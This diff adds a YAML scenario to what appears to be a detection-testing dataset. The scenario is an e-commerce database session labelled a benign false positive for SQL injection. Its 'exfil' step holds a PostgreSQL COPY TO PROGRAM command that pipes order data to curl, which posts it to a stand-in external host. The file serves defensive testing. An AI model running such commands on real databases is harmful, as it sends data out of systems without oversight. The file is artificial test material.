@@ -1,0 +1,32 @@
+scenario_id: gen_ecommerce_84_sql_injection_ben_2527b
+family_id: gen_ecommerce_84_sql_injection_fam_2527
+domain: ecommerce
+time_of_day: 00:05
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT order_item_id, quantity FROM order_items WHERE order_id = 98441
+  - step_id: exfil
+    sql: COPY (SELECT order_item_id, quantity FROM order_items WHERE status = 'flagged')
+      TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 198.51.100.186
+      port: 443
+matched_pair_id: gen_ecommerce_84_sql_injection_pair_2527
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
